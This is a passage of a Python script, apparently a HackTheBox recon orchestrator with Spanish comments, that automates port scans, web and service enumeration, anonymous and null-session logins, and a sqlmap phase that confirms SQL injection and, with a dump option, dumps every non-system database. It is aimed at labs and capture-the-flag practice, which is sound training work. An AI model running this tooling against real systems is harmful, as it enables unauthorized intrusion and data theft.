#!/usr/bin/env python3
"""
htb_recon.py  (v3) - Orquestador de reconocimiento para maquinas Linux de HackTheBox.

Uso:
    python3 htb_recon.py [IP]                     # si no pasas IP, te la pide
    python3 htb_recon.py 10.10.10.10 --quick      # solo top-1000 puertos (mas rapido)
    python3 htb_recon.py 10.10.10.10 --exam       # modo examen: foco en SQLi + prep Metasploit
    python3 htb_recon.py 10.10.10.10 --sqli-dump  # ademas intenta volcar la BD si hay SQLi
    python3 htb_recon.py 10.10.10.10 --udp        # ademas scan UDP top-ports
    python3 htb_recon.py 10.10.10.10 --web-wordlist /ruta/wl.txt

Novedades v3 (enfocado a examen SQLi + Metasploit):
    - FASE 4 dedicada a SQLi: descubre parametros GET y formularios (crawler ligero
      + resultados de gobuster) y lanza sqlmap DIRIGIDO. Si confirma inyeccion,
      enumera DBs/tablas al vuelo. Con --sqli-dump intenta volcar (puede pillar la flag
      si esta en la BD). Time-boxed para que no se eternice.
    - Metasploit: genera msf_<IP>.rc con db_import del nmap (XML) + modulos/busquedas
      sugeridas segun fingerprint. Lo abres con:  msfconsole -q -r recon_<IP>/msf_<IP>.rc
    - Modo --exam: sube el nivel/riesgo de sqlmap, activa crawl+forms y prioriza web.
    - Todo lo de v2: heartbeat, timeouts por modulo, NSE para muchos servicios,
      web enum, REPORTE.md, EXPLOTACION.md, WRITEUP.md.

Nota: usalo solo contra objetivos autorizados (HTB, tu propio lab, etc.).
Pensado para Kali / Parrot.
"""

import os
import re
import sys
import time
import shutil
import argparse
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------- Colores / helpers -----------------------------

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; CY = "\033[96m"; W = "\033[97m"; BOLD = "\033[1m"; END = "\033[0m"

_PRINT_LOCK = threading.Lock()
def _p(text):
    with _PRINT_LOCK:
        print(text)

def banner(text):
    _p(f"\n{C.BOLD}{C.CY}{'='*70}{C.END}\n{C.BOLD}{C.CY}  {text}{C.END}\n{C.BOLD}{C.CY}{'='*70}{C.END}")
def info(text): _p(f"{C.B}[*]{C.END} {text}")
def ok(text):   _p(f"{C.G}[+]{C.END} {text}")
def warn(text): _p(f"{C.Y}[!]{C.END} {text}")
def err(text):  _p(f"{C.R}[-]{C.END} {text}")

# Hallazgos para el resumen/reporte
FINDINGS = []
FINDINGS_LOCK = threading.Lock()
def add_finding(text):
    with FINDINGS_LOCK:
        FINDINGS.append(text)
    ok(text)

# Hostnames descubiertos (para /etc/hosts y fuzzing de vhosts)
HOSTNAMES = set()

# Objetivos SQLi confirmados por sqlmap (para el playbook)
SQLI_CONFIRMED = []
SQLI_LOCK = threading.Lock()

# Registro de comandos+salida para el write-up
WRITEUP = []
WRITEUP_LOCK = threading.Lock()
_ANSI = re.compile(r"\x1b\[[0-9;]*m")

def _record_writeup(cmd_str, output, label=None):
    clean = _ANSI.sub("", output or "")
    lines = clean.splitlines()
    # Cap por comando para que el WRITEUP.md siga siendo manejable
    if len(lines) > 200:
        clean = "\n".join(lines[:200]) + f"\n[... salida recortada, {len(lines)-200} lineas mas; fichero completo en la carpeta ...]"
    with WRITEUP_LOCK:
        WRITEUP.append((label or cmd_str, cmd_str, clean.strip()))

# ----------------------------- Heartbeat (feedback en vivo) ------------------

RUNNING = {}                       # nombre_modulo -> timestamp de inicio
RUNNING_LOCK = threading.Lock()

class track:
    """Context manager que registra un modulo como 'en curso' para el heartbeat."""
    def __init__(self, name): self.name = name
    def __enter__(self):
        with RUNNING_LOCK: RUNNING[self.name] = time.time()
        info(f"Iniciando modulo: {C.W}{self.name}{C.END}")
        return self
    def __exit__(self, *a):
        with RUNNING_LOCK: RUNNING.pop(self.name, None)

def heartbeat_loop(stop_event, interval=15):
    while not stop_event.wait(interval):
        with RUNNING_LOCK:
            snapshot = list(RUNNING.items())
        if snapshot:
            now = time.time()
            items = ", ".join(f"{n} ({int(now-t)}s)" for n, t in snapshot)
            info(f"{C.M}En curso:{C.END} {items}")

# ----------------------------- Ejecucion de comandos -------------------------

def have(tool):
    return shutil.which(tool) is not None

def run(cmd, outfile=None, timeout=600, label=None, record=True):
    """Ejecuta un comando; guarda salida en outfile si se indica; devuelve el texto.
    Ademas registra comando+salida en el WRITEUP.md (salvo record=False)."""
    shell = isinstance(cmd, str)
    cmd_str = cmd if shell else " ".join(cmd)
    try:
        proc = subprocess.run(cmd, shell=shell, capture_output=True, text=True,
                              timeout=timeout, errors="ignore")
        output = (proc.stdout or "") + (proc.stderr or "")
    except subprocess.TimeoutExpired:
        output = f"[TIMEOUT {timeout}s]\n"
    except Exception as e:
        output = f"[ERROR: {e}]\n"
    if outfile:
        try:
            with open(outfile, "w", errors="ignore") as f:
                f.write(output)
        except Exception as e:
            err(f"No pude escribir {outfile}: {e}")
    if record:
        _record_writeup(cmd_str, output, label)
    return output

def nse(ip, port, scripts, name, outdir, timeout=300):
    """Lanza un scan nmap con scripts NSE concretos sobre un puerto."""
    with track(name):
        out = run(["nmap", "-p", str(port), "-sV", "--script", scripts, ip],
                  outfile=os.path.join(outdir, f"{name}.txt"), timeout=timeout)
    return out

# ----------------------------- Wordlists -------------------------------------

def pick_wordlist(deep=False):
    # Por defecto (speedrun): common.txt (~4.700 palabras) -> fase 3 en un par de minutos.
    # Con --deep: lista media (~220k) -> mucho mas lenta pero mas cobertura.
    fast = ["/usr/share/wordlists/dirb/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/common.txt",
            "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"]
    med  = ["/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"]
    for w in (med + fast) if deep else (fast + med):
        if os.path.isfile(w): return w
    return None

def vhost_wordlist():
    for w in ["/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
              "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
              "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"]:
        if os.path.isfile(w): return w
    return None

# ----------------------------- Nmap: puertos ---------------------------------

def parse_grepable(grep_text):
    """Devuelve {puerto: servicio} de una salida grepable de nmap (-oG -)."""
    services = {}
    for line in grep_text.splitlines():
        if "Ports:" not in line: continue
        for entry in line.split("Ports:", 1)[1].split(","):
            parts = entry.strip().split("/")
            if len(parts) >= 3 and parts[1] == "open":
                try: port = int(parts[0])
                except ValueError: continue
                services[port] = parts[4] if len(parts) > 4 and parts[4] else ""
    return services

def fast_port_scan(ip, outdir, quick):
    banner("FASE 1  -  Escaneo de puertos TCP")
    if quick:
        cmd = ["nmap", "--top-ports", "1000", "-T4", "-Pn", "-oG", "-", ip]
    else:
        cmd = ["nmap", "-p-", "--min-rate", "1000", "-T4", "-Pn", "-oG", "-", ip]
    info(f"Ejecutando: {C.W}{' '.join(cmd)}{C.END}")
    grep = run(cmd, outfile=os.path.join(outdir, "nmap_ports.grep"), timeout=1200)
    services = parse_grepable(grep)
    if services:
        ok(f"Puertos abiertos: {C.BOLD}{', '.join(map(str, sorted(services)))}{C.END}")
    else:
        err("Sin puertos abiertos (host caido/filtrado). ¿Estas conectado a la VPN?")
    return services

def detailed_scan(ip, ports, outdir):
    banner("FASE 2  -  Scan detallado (-sCV)")
    port_str = ",".join(map(str, sorted(ports)))
    info(f"Ejecutando: {C.W}nmap -p {port_str} -sCV{C.END}")
    # -oX para poder hacer db_import en Metasploit
    grep = run(["nmap", "-p", port_str, "-sCV", "-Pn",
                "-oN", os.path.join(outdir, "nmap_detailed.txt"),
                "-oX", os.path.join(outdir, "nmap_detailed.xml"),
                "-oG", "-", ip], timeout=1200)
    services = parse_grepable(grep)
    # Hostnames para /etc/hosts y vhost fuzzing
    try:
        with open(os.path.join(outdir, "nmap_detailed.txt"), errors="ignore") as f:
            detailed = f.read()
    except Exception:
        detailed = ""
    for h in set(re.findall(r"([a-zA-Z0-9\-\.]+\.(?:htb|local))", detailed)):
        HOSTNAMES.add(h)
        add_finding(f"Hostname detectado: {h}  ->  añade a /etc/hosts:  {ip} {h}")
    return services or {p: "" for p in ports}

# ----------------------------- Modulos: web ----------------------------------

def enum_web(ip, port, service, outdir, opts):
    scheme = "https" if ("https" in service or "ssl" in service or port in (443, 8443)) else "http"
    base = f"{scheme}://{ip}:{port}"
    tag = f"{scheme}_{port}"
    with track(f"web:{port}"):
        # Rapido primero: cabeceras + robots + whatweb
        if have("curl"):
            run(f"curl -sk -I {base}", os.path.join(outdir, f"headers_{tag}.txt"), timeout=30)
            run(f"curl -sk {base}/robots.txt", os.path.join(outdir, f"robots_{tag}.txt"), timeout=30)
        if have("whatweb"):
            run(["whatweb", "-a", "3", base], os.path.join(outdir, f"whatweb_{tag}.txt"), timeout=120)
        # Directorios
        wl = opts["web_wl"]
        if have("gobuster") and wl:
            run(["gobuster", "dir", "-u", base, "-w", wl, "-t", "50", "-q", "-k",
                 "--timeout", "5s", "--no-error",
                 "-x", "php,html,bak,sql",
                 "-o", os.path.join(outdir, f"gobuster_{tag}.txt")], timeout=600)
        elif not wl:
            warn("Sin wordlist para gobuster (instala seclists o dirb).")
        # Nikto (lento; solo si se pide con --nikto)
        if have("nikto") and opts["nikto"]:
            run(["nikto", "-h", base, "-maxtime", "180",
                 "-o", os.path.join(outdir, f"nikto_{tag}.txt")], timeout=240)
        # Deteccion rapida de inyeccion SQL (spider ligero de nmap). El trabajo
        # fuerte con sqlmap va aparte, en la FASE 4.
        if not opts.get("no_sqli"):
            sqli_out = run(["nmap", "-p", str(port), "--script", "http-sql-injection",
                            "--script-args", "httpspider.maxpagecount=20", ip],
                           os.path.join(outdir, f"sqli_nse_{tag}.txt"), timeout=120)
            if "Possible sqli" in sqli_out or "vulnerable" in sqli_out.lower():
                add_finding(f"POSIBLE SQLi (nmap NSE) en {base} -> revisa sqli_nse_{tag}.txt")
        # Fuzzing de vhosts: solo una vez en toda la ejecucion (no por cada puerto web)
        wv = vhost_wordlist()
        if have("ffuf") and wv and HOSTNAMES and not opts.get("_vhost_done"):
            opts["_vhost_done"] = True
            domain = sorted(HOSTNAMES, key=len)[0]
            run(["ffuf", "-u", f"{scheme}://{ip}", "-H", f"Host: FUZZ.{domain}",
                 "-w", wv, "-mc", "200,204,301,302,307,401,403", "-t", "50", "-s",
                 "-o", os.path.join(outdir, f"ffuf_vhosts_{tag}.json")], timeout=300)
    add_finding(f"Web en {base}  -> revisa headers/robots/gobuster/whatweb (tag {tag})")

# ----------------------------- FASE 4: SQLi (foco examen) --------------------

_HREF_RE = re.compile(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', re.I)
_PARAM_RE = re.compile(r'[?&][A-Za-z0-9_%\.\-\[\]]+=')
_FORM_RE = re.compile(r'<form[^>]*>.*?</form>', re.I | re.S)
_INPUT_NAME_RE = re.compile(r'name\s*=\s*["\']([^"\']+)["\']', re.I)
_ACTION_RE = re.compile(r'action\s*=\s*["\']([^"\']*)["\']', re.I)
_METHOD_RE = re.compile(r'method\s*=\s*["\']([^"\']*)["\']', re.I)
_DYN_EXT = (".php", ".asp", ".aspx", ".jsp", ".do", ".cgi")

def _curl_get(url, timeout=20):
    if not have("curl"):
        return ""
    return run(["curl", "-sk", "-L", "--max-time", str(timeout), url],
               timeout=timeout + 5, record=False)

def _same_host(url, base):
    # Normaliza a solo path si es relativo; acepta absolutos del mismo host.
    base_root = re.match(r'^(https?://[^/]+)', base)
    root = base_root.group(1) if base_root else base
    if url.startswith("http"):
        return url if url.startswith(root) else None
    if url.startswith("//") or url.startswith("mailto:") or url.startswith("javascript:") or url.startswith("#"):
        return None
    if not url.startswith("/"):
        url = "/" + url
    return root + url

def crawl_for_injectables(base, outdir, tag, gobuster_paths, max_pages=25):
    """Crawler ligero via curl: recoge URLs con parametros GET y formularios (POST).
    No depende de herramientas externas; complementa lo que ya saco gobuster."""
    seen, todo = set(), [base]
    param_urls, forms = set(), []

    # Semillas: paginas dinamicas descubiertas por gobuster
    for pth in gobuster_paths:
        u = _same_host(pth, base)
        if u:
            todo.append(u)

    while todo and len(seen) < max_pages:
        url = todo.pop(0)
        if url in seen:
            continue
        seen.add(url)
        html = _curl_get(url)
        if not html:
            continue
        # URLs con parametros -> candidatas directas a sqlmap
        if _PARAM_RE.search(url):
            param_urls.add(url)
        # Enlaces
        for href in _HREF_RE.findall(html):
            full = _same_host(href, base)
            if not full:
                continue
            if _PARAM_RE.search(full):
                param_urls.add(full)
            elif (full.lower().endswith(_DYN_EXT) or full == base) and full not in seen:
                if len(seen) + len(todo) < max_pages:
                    todo.append(full)
        # Formularios -> objetivos POST
        for fm in _FORM_RE.findall(html):
            action = (_ACTION_RE.search(fm) or [None, ""])
            action = action.group(1) if hasattr(action, "group") else ""
            method = (_METHOD_RE.search(fm))
            method = (method.group(1).upper() if method else "GET")
            inputs = _INPUT_NAME_RE.findall(fm)
            act_url = _same_host(action, base) or url
            if inputs:
                forms.append((act_url, method, inputs))

    # Guarda inventario para el playbook / write-up
    inv = ["# URLs con parametros GET:"]
    inv += sorted(param_urls) or ["(ninguna)"]
    inv += ["", "# Formularios (accion | metodo | campos):"]
    for a, m, ins in forms:
        inv.append(f"{a} | {m} | {','.join(ins)}")
    with open(os.path.join(outdir, f"sqli_targets_{tag}.txt"), "w", errors="ignore") as f:
        f.write("\n".join(inv) + "\n")
    return sorted(param_urls), forms

def _sqlmap_flags(opts):
    lvl = "3" if opts.get("exam") else "2"
    return ["--batch", "--random-agent", "--level", lvl, "--risk", "2",
            "--threads", "4", "--timeout", "10", "--retries", "1",
            "--disable-coloring"]

def _sqlmap_verdict(out):
    low = (out or "").lower()
    vuln = ("the following injection point" in low
            or "is vulnerable" in low
            or re.search(r"parameter '[^']+' is vulnerable", low) is not None
            or "back-end dbms:" in low)
    dbms = None
    m = re.search(r"back-end DBMS: *(.+)", out or "")
    if m:
        dbms = m.group(1).strip().splitlines()[0]
    return vuln, dbms

def _gobuster_dynamic_paths(outdir):
    paths = []
    try:
        for fn in os.listdir(outdir):
            if fn.startswith("gobuster_"):
                for line in open(os.path.join(outdir, fn), errors="ignore"):
                    m = re.search(r"(/\S+)", line.strip())
                    if m and m.group(1).lower().split("?")[0].endswith(_DYN_EXT):
                        paths.append(m.group(1))
    except Exception:
        pass
    # dedup manteniendo orden
    out, seen = [], set()
    for p in paths:
        if p not in seen:
            seen.add(p); out.append(p)
    return out[:20]

def sqli_phase(ip, services, outdir, opts):
    """FASE 4: descubre objetivos inyectables y lanza sqlmap dirigido (time-boxed)."""
    if opts.get("no_sqli"):
        return
    if not have("sqlmap"):
        warn("sqlmap no instalado -> me salto la fase SQLi (instala sqlmap).")
        return

    web_ports = [(p, s) for p, s in services.items()
                 if "http" in s.lower() or p in (80, 443, 8080, 8000, 8443, 8888, 8081, 3000)]
    if not web_ports:
        info("Sin servicios web -> nada que inyectar.")
        return

    banner("FASE 4  -  SQL Injection (sqlmap dirigido)")
    stop = threading.Event()
    hb = threading.Thread(target=heartbeat_loop, args=(stop,), daemon=True); hb.start()

    per_url_to = 180 if opts.get("exam") else 120     # timeout por objetivo
    max_targets = 8 if opts.get("exam") else 5        # tope de URLs para no eternizarse
    base_flags = _sqlmap_flags(opts)
    gob_dyn = _gobuster_dynamic_paths(outdir)

    for port, service in web_ports:
        s = service.lower()
        scheme = "https" if ("https" in s or "ssl" in s or port in (443, 8443)) else "http"
        host = sorted(HOSTNAMES, key=len)[0] if HOSTNAMES else ip
        base = f"{scheme}://{host}:{port}"
        tag = f"{scheme}_{port}"
        with track(f"sqli:{port}"):
            info(f"Descubriendo parametros/formularios en {base} ...")
            param_urls, forms = crawl_for_injectables(base, outdir, tag, gob_dyn)
            targets = param_urls[:max_targets]
            if targets:
                ok(f"{len(param_urls)} URL(s) con parametros; pruebo {len(targets)}.")
            else:
                info("No hallé URLs con parametros GET; usaré --crawl/--forms sobre la base.")

            # 1) URLs con parametros GET (lo mas fiable para sqlmap)
            for i, u in enumerate(targets):
                out = run(["sqlmap", "-u", u] + base_flags,
                          os.path.join(outdir, f"sqlmap_{tag}_{i}.txt"),
                          timeout=per_url_to, label=f"sqlmap GET {u}")
                _handle_sqli_hit(ip, u, out, base_flags, outdir, tag, i, opts, method="GET")

            # 2) Formularios (POST/GET) -> sqlmap --forms sobre cada accion
            for j, (act, method, inputs) in enumerate(forms[:max_targets]):
                out = run(["sqlmap", "-u", act, "--forms"] + base_flags,
                          os.path.join(outdir, f"sqlmap_form_{tag}_{j}.txt"),
                          timeout=per_url_to, label=f"sqlmap --forms {act}")
                _handle_sqli_hit(ip, act, out, base_flags, outdir, tag, f"form{j}", opts, method=method)

            # 3) Red de seguridad: crawl + forms desde la raiz (por si el crawler propio
            #    no vio nada). En modo examen siempre; si no, solo cuando no hubo objetivos.
            if opts.get("exam") or not targets:
                crawl = "2" if opts.get("exam") else "1"
                out = run(["sqlmap", "-u", base, "--crawl", crawl, "--forms"] + base_flags,
                          os.path.join(outdir, f"sqlmap_crawl_{tag}.txt"),
                          timeout=per_url_to + 120, label=f"sqlmap --crawl {base}")
                _handle_sqli_hit(ip, base, out, base_flags, outdir, tag, "crawl", opts, method="AUTO")

    stop.set()
    if not SQLI_CONFIRMED:
        info("sqlmap no confirmó inyeccion automatica. Revisa a mano los formularios de login "
             "(capturalos con Burp -> sqlmap -r req.txt).")

def _handle_sqli_hit(ip, target, out, base_flags, outdir, tag, idx, opts, method="GET"):
    vuln, dbms = _sqlmap_verdict(out)
    if not vuln:
        return
    with SQLI_LOCK:
        SQLI_CONFIRMED.append((target, method, dbms or "?"))
    add_finding(f"SQLi CONFIRMADA por sqlmap en {target}  (metodo {method}, DBMS {dbms or '?'})")

    # Reconstruye los args base del objetivo (URL o --forms)
    tgt_args = ["-u", target]
    if "form" in str(idx) or method not in ("GET", "AUTO"):
        tgt_args += ["--forms"]

    # Enumeracion rapida: bases de datos + BD actual + tablas de la BD actual
    run(["sqlmap"] + tgt_args + base_flags + ["--current-db", "--current-user", "--dbs"],
        os.path.join(outdir, f"sqlmap_enum_{tag}_{idx}.txt"),
        timeout=180, label=f"sqlmap enum {target}")
    tbl = run(["sqlmap"] + tgt_args + base_flags + ["--tables"],
              os.path.join(outdir, f"sqlmap_tables_{tag}_{idx}.txt"),
              timeout=180, label=f"sqlmap --tables {target}")

    # Volcado opcional (puede pillar la flag si esta en la BD). Time-boxed.
    if opts.get("sqli_dump"):
        info("--sqli-dump activo: intento volcar (excluyendo BDs del sistema)...")
        run(["sqlmap"] + tgt_args + base_flags +
            ["--dump-all", "--exclude-sysdbs"],
            os.path.join(outdir, f"sqlmap_dump_{tag}_{idx}.txt"),
            timeout=420, label=f"sqlmap --dump-all {target}")
        # Busca algo que huela a flag en el volcado
        try:
            blob = open(os.path.join(outdir, f"sqlmap_dump_{tag}_{idx}.txt"), errors="ignore").read()
            for m in re.findall(r"(HTB\{[^}]+\}|flag\{[^}]+\}|[a-f0-9]{32})", blob):
                add_finding(f"Posible FLAG/hash en el volcado SQLi: {m}")
        except Exception:
            pass

# ----------------------------- Modulos: SMB / FTP ----------------------------

def enum_smb(ip, outdir):
    with track("smb"):
        if have("enum4linux-ng"):
            run(["enum4linux-ng", "-A", ip], os.path.join(outdir, "enum4linux.txt"), timeout=600)
        elif have("enum4linux"):
            run(["enum4linux", "-a", ip], os.path.join(outdir, "enum4linux.txt"), timeout=600)
        if have("smbmap"):
            run(["smbmap", "-H", ip], os.path.join(outdir, "smbmap.txt"), timeout=180)
        if have("smbclient"):
            run(f"smbclient -N -L //{ip}/", os.path.join(outdir, "smbclient_shares.txt"), timeout=120)
    add_finding("SMB -> revisa shares con null session (smbmap.txt, smbclient_shares.txt)")

def enum_ftp(ip, port, outdir):
    with track(f"ftp:{port}"):
        out = run(f"echo -e 'open {ip} {port}\\nuser anonymous anonymous\\nls\\nbye' | ftp -n -v",
                  os.path.join(outdir, "ftp_anon.txt"), timeout=60)
    if "230" in out or "Login successful" in out:
        add_finding(f"FTP ANONIMO permitido en {port} -> ftp_anon.txt")
    else:
        info(f"FTP {port}: anonimo no permitido.")

# ----------------------------- Modulos: otros servicios ----------------------

def enum_dns(ip, outdir):
    with track("dns"):
        domains = HOSTNAMES or {"htb.local"}
        for d in domains:
            run(["dig", "axfr", f"@{ip}", d], os.path.join(outdir, f"dns_axfr_{d}.txt"), timeout=60)
    add_finding("DNS (53) -> intenta AXFR con los dominios que descubras (dns_axfr_*.txt)")

def enum_nfs(ip, outdir):
    with track("nfs"):
        if have("showmount"):
            out = run(["showmount", "-e", ip], os.path.join(outdir, "nfs_showmount.txt"), timeout=60)
            if "/" in out:
                add_finding("Exports NFS encontrados -> nfs_showmount.txt (posible mount -o vers=X)")
        if have("rpcinfo"):
            run(["rpcinfo", "-p", ip], os.path.join(outdir, "rpcinfo.txt"), timeout=60)

def enum_ldap(ip, outdir):
    with track("ldap"):
        if have("ldapsearch"):
            run(["ldapsearch", "-x", "-H", f"ldap://{ip}", "-s", "base", "namingcontexts"],
                os.path.join(outdir, "ldap_base.txt"), timeout=60)
            add_finding("LDAP (389) -> naming contexts en ldap_base.txt (bind anonimo)")

def enum_redis(ip, port, outdir):
    with track(f"redis:{port}"):
        if have("redis-cli"):
            out = run(["redis-cli", "-h", ip, "-p", str(port), "INFO"],
                      os.path.join(outdir, f"redis_{port}.txt"), timeout=60)
            if "redis_version" in out:
                add_finding(f"Redis SIN AUTH en {port} -> redis_{port}.txt (acceso directo!)")
        else:
            nse(ip, port, "redis-info", f"redis_{port}", outdir)

def enum_elastic(ip, port, outdir):
    with track(f"elastic:{port}"):
        if have("curl"):
            run(f"curl -s http://{ip}:{port}/_cat/indices?v", os.path.join(outdir, f"elastic_{port}.txt"), timeout=60)
            add_finding(f"Elasticsearch en {port} -> elastic_{port}.txt (revisa indices sin auth)")

# Servicios cubiertos con nmap NSE (herramientas siempre disponibles)
def enum_mysql(ip, p, o):  nse(ip, p, "mysql-info,mysql-empty-password,mysql-users", f"mysql_{p}", o); add_finding(f"MySQL {p} -> mysql_{p}.txt (prueba root sin pass)")
def enum_mssql(ip, p, o):  nse(ip, p, "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password", f"mssql_{p}", o); add_finding(f"MSSQL {p} -> mssql_{p}.txt")
def enum_pgsql(ip, p, o):  nse(ip, p, "banner", f"pgsql_{p}", o, timeout=60); add_finding(f"PostgreSQL {p} -> pgsql_{p}.txt (prueba 'psql -h {ip} -U postgres')")
def enum_mongo(ip, p, o):  nse(ip, p, "mongodb-info,mongodb-databases", f"mongo_{p}", o); add_finding(f"MongoDB {p} -> mongo_{p}.txt (posible sin auth)")
def enum_smtp(ip, p, o):   nse(ip, p, "smtp-commands,smtp-open-relay,smtp-enum-users", f"smtp_{p}", o); add_finding(f"SMTP {p} -> smtp_{p}.txt (VRFY/EXPN para user enum)")
def enum_mail(ip, p, o):   nse(ip, p, "banner,pop3-capabilities,imap-capabilities", f"mail_{p}", o); add_finding(f"Correo {p} -> mail_{p}.txt")
def enum_rdp(ip, p, o):    nse(ip, p, "rdp-ntlm-info,rdp-enum-encryption", f"rdp_{p}", o); add_finding(f"RDP {p} -> rdp_{p}.txt (rdp-ntlm-info filtra hostname/dominio)")
def enum_vnc(ip, p, o):    nse(ip, p, "vnc-info,vnc-title", f"vnc_{p}", o); add_finding(f"VNC {p} -> vnc_{p}.txt")
def enum_telnet(ip, p, o): nse(ip, p, "telnet-encryption,banner", f"telnet_{p}", o); add_finding(f"Telnet {p} -> telnet_{p}.txt (banner/credenciales debiles)")

def udp_scan(ip, outdir):
    banner("Escaneo UDP (top 50)")
    grep = run(["nmap", "-sU", "--top-ports", "50", "--open", "-oG", "-", ip],
               os.path.join(outdir, "nmap_udp.grep"), timeout=900)
    return parse_grepable(grep)

def enum_snmp(ip, outdir):
    with track("snmp"):
        if have("snmpwalk"):
            run(["snmpwalk", "-v2c", "-c", "public", ip], os.path.join(outdir, "snmpwalk.txt"), timeout=180)
            add_finding("SNMP -> snmpwalk.txt (community 'public')")

# ----------------------------- Dispatcher ------------------------------------

def dispatch(ip, services, outdir, opts):
    banner("FASE 3  -  Enumeracion por servicio (en paralelo)")
    stop = threading.Event()
    hb = threading.Thread(target=heartbeat_loop, args=(stop,), daemon=True); hb.start()

    smb_done = False
    tasks = []
    with ThreadPoolExecutor(max_workers=8) as ex:
        for port, service in sorted(services.items()):
            s = service.lower()
            if "http" in s or port in (80, 443, 8080, 8000, 8443, 8888, 8081, 3000):
                tasks.append(ex.submit(enum_web, ip, port, s, outdir, opts))
            elif "ftp" in s or port == 21:
                tasks.append(ex.submit(enum_ftp, ip, port, outdir))
            elif "microsoft-ds" in s or "netbios" in s or port in (139, 445):
                if not smb_done: tasks.append(ex.submit(enum_smb, ip, outdir)); smb_done = True
            elif "domain" in s or port == 53:
                tasks.append(ex.submit(enum_dns, ip, outdir))
            elif "rpcbind" in s or "nfs" in s or port in (111, 2049):
                tasks.append(ex.submit(enum_nfs, ip, outdir))
            elif "ldap" in s or port in (389, 636):
                tasks.append(ex.submit(enum_ldap, ip, outdir))
            elif "redis" in s or port == 6379:
                tasks.append(ex.submit(enum_redis, ip, port, outdir))
            elif "elasticsearch" in s or port == 9200:
                tasks.append(ex.submit(enum_elastic, ip, port, outdir))
            elif "mysql" in s or port == 3306:
                tasks.append(ex.submit(enum_mysql, ip, port, outdir))
            elif "ms-sql" in s or "mssql" in s or port == 1433:
                tasks.append(ex.submit(enum_mssql, ip, port, outdir))
            elif "postgres" in s or port == 5432:
                tasks.append(ex.submit(enum_pgsql, ip, port, outdir))
            elif "mongo" in s or port == 27017:
                tasks.append(ex.submit(enum_mongo, ip, port, outdir))
            elif "smtp" in s or port in (25, 465, 587):
                tasks.append(ex.submit(enum_smtp, ip, port, outdir))
            elif "pop3" in s or "imap" in s or port in (110, 143, 993, 995):
                tasks.append(ex.submit(enum_mail, ip, port, outdir))
            elif "ms-wbt" in s or "rdp" in s or port == 3389:
                tasks.append(ex.submit(enum_rdp, ip, port, outdir))
            elif "vnc" in s or port in (5900, 5901):
                tasks.append(ex.submit(enum_vnc, ip, port, outdir))
            elif "telnet" in s or port == 23:
                tasks.append(ex.submit(enum_telnet, ip, port, outdir))
            elif "ssh" in s or port == 22:
                add_finding(f"SSH {port} -> anota version/usuarios; busca claves privadas si consigues LFI/lectura")
            else:
                info(f"Puerto {port} ({service or 'desconocido'}) sin modulo especifico -> revisa manual.")

        if opts["udp"]:
            for port, service in udp_scan(ip, outdir).items():
                if "snmp" in service.lower() or port == 161:
                    tasks.append(ex.submit(enum_snmp, ip, outdir))

        for fut in as_completed(tasks):
            if fut.exception():
                err(f"Un modulo fallo: {fut.exception()}")

    stop.set()

# ----------------------------- Resumen + reporte -----------------------------

def summary_and_report(ip, services, outdir):
    banner("RESUMEN  -  Vectores a revisar")
    _p(f"{C.BOLD}Objetivo:{C.END} {ip}")
    _p(f"{C.BOLD}Salida:{C.END} {outdir}/\n")
    _p(f"{C.BOLD}{C.G}Puertos TCP abiertos: {len(services)}{C.END}   "
       f"({', '.join(map(str, sorted(services)))})")
    _p(f"{C.BOLD}Puertos abiertos:{C.END}")
    for port, service in sorted(services.items()):
        _p(f"   {C.G}{port:>5}{C.END}  {service or '(sin deteccion)'}")
    _p("")
    if SQLI_CONFIRMED:
        _p(f"{C.BOLD}{C.R}SQLi confirmada:{C.END}")
        for t, m, d in SQLI_CONFIRMED:
            _p(f"   {C.R}->{C.END} {t}  ({m}, {d})")
        _p("")
    if FINDINGS:
        _p(f"{C.BOLD}Pistas / vectores:{C.END}")
        for f in FINDINGS:
            _p(f"   {C.Y}->{C.END} {f}")
    _p(f"\n{C.CY}Empieza por:{C.END} web y SMB suelen ser la entrada en HTB Linux. "
       f"Si hay web con parametros, prueba inyecciones (sqlmap) y LFI/RFI.\n")

    # Reporte Markdown
    lines = [f"# Reporte de recon - {ip}", "",
             f"Generado: {time.strftime('%Y-%m-%d %H:%M:%S')}", "",
             f"**Puertos TCP abiertos: {len(services)}**  ({', '.join(map(str, sorted(services)))})", "",
             "## Puertos abiertos", ""]
    for port, service in sorted(services.items()):
        lines.append(f"- **{port}** — {service or 'sin deteccion'}")
    if SQLI_CONFIRMED:
        lines += ["", "## SQLi confirmada", ""]
        lines += [f"- `{t}` ({m}, {d})" for t, m, d in SQLI_CONFIRMED]
    lines += ["", "## Pistas y vectores", ""]
    lines += [f"- {f}" for f in FINDINGS] or ["- (sin hallazgos automaticos)"]
    if HOSTNAMES:
        lines += ["", "## /etc/hosts sugerido", "", "```"]
        lines += [f"{ip} {h}" for h in sorted(HOSTNAMES)]
        lines += ["```"]
    lines += ["", "## Archivos generados", ""]
    for fn in sorted(os.listdir(outdir)):
        lines.append(f"- `{fn}`")
    report = os.path.join(outdir, "REPORTE.md")
    with open(report, "w", errors="ignore") as f:
        f.write("\n".join(lines) + "\n")
    ok(f"Reporte escrito en {report}")

# ----------------------------- Playbook de explotacion -----------------------

def _has(services, ports, keywords):
    """True si algun servicio detectado casa por puerto o por nombre."""
    for p, s in services.items():
        if p in ports: return True
        if any(k in s.lower() for k in keywords): return True
    return False

def _read(path):
    try:
        with open(path, errors="ignore") as f:
            return f.read()
    except Exception:
        return ""

def _fingerprint_blob(outdir):
    """Junta nmap + whatweb + headers en un solo texto para buscar firmas."""
    blob = _read(os.path.join(outdir, "nmap_detailed.txt"))
    try:
        for fn in os.listdir(outdir):
            if fn.startswith(("whatweb_", "headers_")):
                blob += "\n" + _read(os.path.join(outdir, fn))
    except Exception:
        pass
    return blob

def _nmap_versions(outdir):
